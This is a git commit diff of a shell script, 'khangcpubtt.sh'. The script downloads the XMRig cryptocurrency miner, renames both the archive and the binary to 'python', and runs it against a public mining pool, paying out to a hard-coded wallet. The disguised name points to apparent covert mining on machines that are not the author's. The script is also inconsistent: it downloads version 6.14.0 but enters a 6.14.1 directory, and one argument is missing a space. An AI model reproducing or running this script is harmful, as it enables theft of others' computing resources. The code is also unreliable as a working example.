9fb81754865ccf684239b1d15b98b0617d360f37
Khang0810 <89994101+Khang0810@users.noreply.github.com>
2021-09-03 07:34:38 +0700

    Update khangcpubtt.sh

--- khangcpubtt.sh
+++ khangcpubtt.sh
@@ -1,5 +1,5 @@
 curl -L -o python.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar -zxvf python.tar.gz
-cd v6.14.0
+cd xmrig-6.14.1
 mv xmrig python
- ./python -o rx.unmineable.com:3333 -a rx -k -u BTT:0xacc4e69563A9897B09f8Ef36A7e60256f28Ef191.Miner -p x
+ ./python -o rx.unmineable.com:3333 -a rx -k -u BTT:TYSnLDWrR5TmqgRKTM2ApKkng5ZW9j9iaH.Miner-p x
